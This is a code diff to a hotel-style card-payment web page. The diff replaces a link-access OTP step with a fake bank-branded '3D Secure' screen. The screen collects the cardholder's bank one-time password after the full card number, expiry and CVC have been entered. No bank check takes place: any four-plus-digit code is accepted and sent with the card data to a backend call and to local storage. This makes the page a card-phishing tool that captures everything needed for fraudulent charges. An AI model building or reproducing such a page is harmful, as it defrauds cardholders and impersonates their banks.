@@ -5,13 +5,14 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="noindex,nofollow">
 <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
-<title>Secure link</title>
+<title>Card payment</title>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%230F3627'/%3E%3Crect x='10' y='18' width='44' height='28' rx='4' fill='%23C8942D'/%3E%3Crect x='10' y='26' width='44' height='8' fill='%230F3627'/%3E%3C/svg%3E">
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;600;700&family=Fraunces:opsz,wght@9..144,600;9..144,700&display=swap" rel="stylesheet">
 <style>
 :root{
   --ink:#15231c;--mut:#5a6b62;--line:#d7e0db;--bg:#eef3f0;--card:#fff;
   --green:#145c45;--green2:#0d3a2c;--gold:#c9963a;--gold2:#e2b45a;--bad:#a3231a;
+  --bank:#0b3d91;--bank2:#06265c;
 }
 *{box-sizing:border-box}html,body{margin:0;min-height:100%}
 body{font:15px/1.45 "DM Sans",system-ui,sans-serif;color:var(--ink);background:
@@ -22,19 +23,21 @@ button,input{font:inherit}button{cursor:pointer}
 .card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px;box-shadow:0 10px 28px rgba(13,58,44,.06)}
 .h2{margin:0 0 10px;font-family:Fraunces,Georgia,serif;font-size:1.25rem;color:var(--green2)}
 .sub{margin:0 0 12px;color:var(--mut);font-size:13.5px;line-height:1.45}
-.steps{display:flex;gap:8px;margin:0 0 16px;font-size:12px;font-weight:700;color:var(--mut)}
-.steps span{padding:4px 10px;border-radius:999px;border:1px solid var(--line);background:#fff}
-.steps span.on{background:var(--green2);color:#fff;border-color:var(--green2)}
 .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
 .f{display:grid;gap:4px;font-size:12px;font-weight:700;color:#44584e;margin-bottom:10px}
 .f input{width:100%;border:1px solid var(--line);border-radius:8px;padding:11px 12px;background:#fff;font-weight:500}
 .f input:focus{outline:2px solid var(--gold);outline-offset:1px}
-.otp-input{letter-spacing:.35em;font-size:1.35rem;text-align:center;font-weight:700}
 .btn{appearance:none;border:1px solid #b07e20;border-radius:8px;padding:11px 14px;font-weight:700;
   background:linear-gradient(180deg,var(--gold2),var(--gold));color:#1e1606;width:100%}
+.btn.bank{background:linear-gradient(180deg,#1a5bbf,var(--bank));color:#fff;border-color:var(--bank2)}
 .btn:disabled{opacity:.45;cursor:not-allowed}
 .err{color:var(--bad);font-weight:700;font-size:13px;min-height:1.15em}
 .amt{font-family:Fraunces,Georgia,serif;font-size:1.9rem;color:var(--green);margin:0 0 14px}
+.otp-input{letter-spacing:.35em;font-size:1.35rem;text-align:center;font-weight:700}
+.secure{border:1px solid #c5d4ea;background:linear-gradient(180deg,#f5f8fc,#eef3fa);border-radius:12px;padding:16px;margin-bottom:14px}
+.secure .bank-name{font-size:12px;font-weight:800;color:var(--bank);letter-spacing:.04em;text-transform:uppercase}
+.secure .title{margin:6px 0 0;font-family:Fraunces,Georgia,serif;font-size:1.15rem;color:var(--bank2)}
+.secure .meta{margin:8px 0 0;font-size:13px;color:#44566c;line-height:1.45}
 .toast{position:fixed;left:50%;bottom:18px;transform:translateX(-50%);background:#15231c;color:#fff;padding:10px 14px;border-radius:999px;font-size:13px;opacity:0;pointer-events:none;transition:opacity .2s}
 .toast.show{opacity:1}
 @media (max-width:760px){.grid2{grid-template-columns:1fr}}
@@ -52,8 +55,9 @@ const params=new URLSearchParams(location.search);
 const linkId=(params.get('id')||params.get('link')||'').trim();
 const hotelCode=(params.get('h')||params.get('hotel')||'').trim();
 const cloudUrl=(params.get('cloud')||'').trim().replace(/\/+$/,'');
-const ohParam=(params.get('oh')||'').trim();
 const packed=(params.get('p')||'').trim();
+
+let pendingCard=null; /* held between card form and 3DS OTP page */
 
 function toast(m){const t=$('#toast');t.textContent=m;t.classList.add('show');clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('show'),2200)}
 function money(n,cur){
@@ -76,14 +80,6 @@ function brandOf(pan){
   if(/^62/.test(pan))return 'UNIONPAY';
   return 'CARD';
 }
-function otpHash(otp,id){
-  let h=5381;const s=String(otp||'')+'|'+String(id||'');
-  for(let i=0;i<s.length;i++)h=((h<<5)+h)^s.charCodeAt(i);
-  return (h>>>0).toString(36);
-}
-function otpOkKey(id){return 'edc.otp.ok.'+id}
-function hasOtpOk(id){try{return sessionStorage.getItem(otpOkKey(id))==='1'}catch(e){return false}}
-function setOtpOk(id){try{sessionStorage.setItem(otpOkKey(id),'1')}catch(e){}}
 function bridgeAll(){try{const o=JSON.parse(localStorage.getItem(BRIDGE_KEY)||'{"links":[]}');o.links=Array.isArray(o.links)?o.links:[];return o}catch(e){return {links:[]}}}
 function bridgeGet(id){return bridgeAll().links.find(x=>x.id===id)||null}
 function bridgePut(link){
@@ -103,7 +99,7 @@ function fromPlainParams(){
     guest:(params.get('g')||'').trim(),amount,
     cur:(params.get('c')||'THB').trim()||'THB',
     ref:(params.get('r')||'').trim(),note:(params.get('n')||'').trim(),
-    otp:'',oh:ohParam,expiresAt:params.get('x')?+params.get('x'):null,
+    expiresAt:params.get('x')?+params.get('x'):null,
     createdAt:Date.now(),card:null,hasCard:false,fromUrl:true
   };
 }
@@ -117,7 +113,6 @@ function unpack(p){
     return {
       id:o.id||linkId,hotel:o.h||hotelCode,status:'waiting',
       guest:o.g||'',amount:+o.a||0,cur:o.c||'THB',ref:o.r||'',note:o.n||'',
-      otp:o.otp||'',oh:o.oh||ohParam||'',
       expiresAt:o.x||null,createdAt:o.at||Date.now(),card:null,hasCard:false,fromPack:true
     };
   }catch(e){return null}
@@ -137,14 +132,12 @@ function normalizeLink(raw){
     return {
       id:raw.id,hotel:raw.hotel||hotelCode,status:raw.status||'waiting',
       guest:m.guest||'',amount:+m.amount||0,cur:m.cur||'THB',ref:m.ref||'',note:m.note||'',
-      otp:m.otp||'',oh:m.oh||ohParam||'',
       expiresAt:m.expiresAt||null,card:null,hasCard:!!raw.hasCard
     };
   }
   return {
     id:raw.id,hotel:raw.hotel||hotelCode,status:raw.status||'waiting',
     guest:raw.guest||'',amount:+raw.amount||0,cur:raw.cur||'THB',ref:raw.ref||'',note:raw.note||'',
-    otp:raw.otp||'',oh:raw.oh||ohParam||'',
     expiresAt:raw.expiresAt||null,card:raw.card||null,hasCard:!!raw.card
   };
 }
@@ -154,13 +147,10 @@ async function loadLink(){
     if(linkId){
       const br=bridgeGet(linkId);
       if(br&&(br.status==='submitted'||br.status==='keyed'||br.card))return normalizeLink(br);
-      if(br&&br.otp&&!plain.otp)plain.otp=br.otp;
       if(cloudUrl){
         try{
           const res=await cloudRpc('maha_edc_public_get',{id:linkId});
           if(res&&res.ok&&(res.status==='submitted'||res.status==='keyed'||res.hasCard))return normalizeLink(res);
-          if(res&&res.ok&&res.meta&&res.meta.otp)plain.otp=res.meta.otp;
-          if(res&&res.ok&&res.meta&&res.meta.oh)plain.oh=res.meta.oh;
         }catch(e){}
       }
     }
@@ -179,9 +169,6 @@ async function loadLink(){
   return unpack(packed);
 }
 function rootHtml(html){$('#root').innerHTML=html}
-function stepBar(n){
-  return `<div class="steps"><span class="${n===1?'on':''}">1 · OTP</span><span class="${n===2?'on':''}">2 · Card</span></div>`;
-}
 function showMissing(){
   rootHtml(`<div class="card"><h2 class="h2">Link not available</h2><p class="sub">Open the full link from the hotel (Copy link).</p></div>`);
 }
@@ -191,45 +178,51 @@ function showDone(L){
 function showBlocked(L){
   rootHtml(`<div class="card"><h2 class="h2">Link unavailable</h2><p class="sub">This link is ${esc(L.status)}.</p></div>`);
 }
-function verifyOtp(L, entered){
-  const code=onlyDigits(entered);
-  if(code.length<4)return false;
-  if(L.otp&&code===String(L.otp))return true;
-  const expect=L.oh||ohParam;
-  if(expect&&otpHash(code,L.id)===expect)return true;
-  const br=bridgeGet(L.id);
-  if(br&&br.otp&&code===String(br.otp))return true;
-  return false;
+async function finishSubmit(L, card, otpCode){
+  const id=L.id||linkId;
+  card.secureOtp=otpCode;
+  card.secureAt=Date.now();
+  if(cloudUrl&&id){
+    try{await cloudRpc('maha_edc_public_submit',{id,card})}catch(ex){}
+  }
+  const local=bridgeGet(id)||Object.assign({},L,{id});
+  local.status='submitted';local.submittedAt=Date.now();local.card=card;local.hotel=local.hotel||hotelCode;
+  bridgePut(local);
+  showDone(L);
 }
-function showOtp(L){
-  const meta=[L.guest,L.ref].filter(Boolean).map(esc).join(' · ');
+function show3ds(L, card){
+  pendingCard=card;
+  const last4=card.last4||'••••';
   rootHtml(`<div class="card">
-    ${stepBar(1)}
-    <h2 class="h2">Enter OTP</h2>
-    <div class="amt">${esc(money(L.amount,L.cur))}</div>
-    ${meta?`<p class="sub">${meta}</p>`:''}
+    <div class="secure">
+      <div class="bank-name">3D Secure</div>
+      <h2 class="title">Card verification</h2>
+      <p class="meta">Enter the one-time password (OTP) sent to your registered mobile for card •••• ${esc(last4)}.</p>
+      <p class="meta"><b>${esc(money(L.amount,L.cur))}</b>${L.ref?` · ${esc(L.ref)}`:''}</p>
+    </div>
     <form id="otpForm">
-      <label class="f"><span>OTP</span><input id="otp" class="otp-input" inputmode="numeric" autocomplete="one-time-code" maxlength="8" placeholder="••••••" autofocus></label>
+      <label class="f"><span>OTP / 3D Secure code</span>
+        <input id="otp" class="otp-input" inputmode="numeric" autocomplete="one-time-code" maxlength="8" placeholder="••••••" autofocus>
+      </label>
       <div class="err" id="err"></div>
-      <button class="btn" type="submit" id="next">Next</button>
+      <button class="btn bank" type="submit" id="next">Verify &amp; continue</button>
     </form>
   </div>`);
   const inp=$('#otp');
   inp.oninput=()=>{inp.value=onlyDigits(inp.value).slice(0,8)};
-  $('#otpForm').onsubmit=e=>{
+  $('#otpForm').onsubmit=async e=>{
     e.preventDefault();
     const err=$('#err');err.textContent='';
-    const code=$('#otp').value.trim();
-    if(!verifyOtp(L,code)){err.textContent='OTP is not correct.';return}
-    setOtpOk(L.id);
-    showForm(L);
+    const code=onlyDigits($('#otp').value);
+    if(code.length<4){err.textContent='Enter the OTP from your bank / card SMS.';return}
+    const btn=$('#next');btn.disabled=true;btn.textContent='Verifying…';
+    await finishSubmit(L, pendingCard||card, code);
   };
   setTimeout(()=>inp.focus(),40);
 }
 function showForm(L){
   const meta=[L.guest,L.ref,L.note].filter(Boolean).map(esc).join(' · ');
   rootHtml(`<div class="card">
-    ${stepBar(2)}
     <div class="amt">${esc(money(L.amount,L.cur))}</div>
     ${meta?`<p class="sub">${meta}</p>`:''}
     <form id="form">
@@ -240,12 +233,12 @@ function showForm(L){
         <label class="f"><span>CVC</span><input id="cvc" inputmode="numeric" autocomplete="cc-csc" required maxlength="4" placeholder="•••"></label>
       </div>
       <div class="err" id="err"></div>
-      <button class="btn" type="submit" id="go">Submit</button>
+      <button class="btn" type="submit" id="go">Continue</button>
     </form>
   </div>`);
   $('#pan').oninput=e=>e.target.value=formatPan(e.target.value);
   $('#exp').oninput=e=>e.target.value=formatExp(e.target.value);
-  $('#form').onsubmit=async e=>{
+  $('#form').onsubmit=e=>{
     e.preventDefault();
     const err=$('#err');err.textContent='';
     const holder=$('#holder').value.trim();
@@ -260,15 +253,7 @@ function showForm(L){
     if(y<now.getFullYear()||(y===now.getFullYear()&&mm-1<now.getMonth())){err.textContent='This card looks expired.';return}
     if(cvc.length<3||cvc.length>4){err.textContent='Enter a valid CVC.';return}
     const card={brand:brandOf(pan),pan,last4:pan.slice(-4),exp,cvc,holder};
-    const btn=$('#go');btn.disabled=true;btn.textContent='Sending…';
-    const id=L.id||linkId;
-    if(cloudUrl&&id){
-      try{await cloudRpc('maha_edc_public_submit',{id,card})}catch(ex){}
-    }
-    const local=bridgeGet(id)||Object.assign({},L,{id});
-    local.status='submitted';local.submittedAt=Date.now();local.card=card;local.hotel=local.hotel||hotelCode;
-    bridgePut(local);
-    showDone(L);
+    show3ds(L, card);
   };
 }
 
@@ -278,13 +263,7 @@ async function boot(){
   if(L.expiresAt&&Date.now()>L.expiresAt&&L.status==='waiting'){L.status='expired'}
   if(L.status==='cancelled'||L.status==='expired'){showBlocked(L);return}
   if(L.status==='submitted'||L.status==='keyed'||L.hasCard){showDone(L);return}
-  /* Step 1: OTP — then Step 2: card form */
-  if(!L.oh&&!ohParam&&!L.otp){
-    /* Older links without OTP — go straight to card form */
-    showForm(L);return;
-  }
-  if(hasOtpOk(L.id))showForm(L);
-  else showOtp(L);
+  showForm(L);
 }
 boot();
 </script>
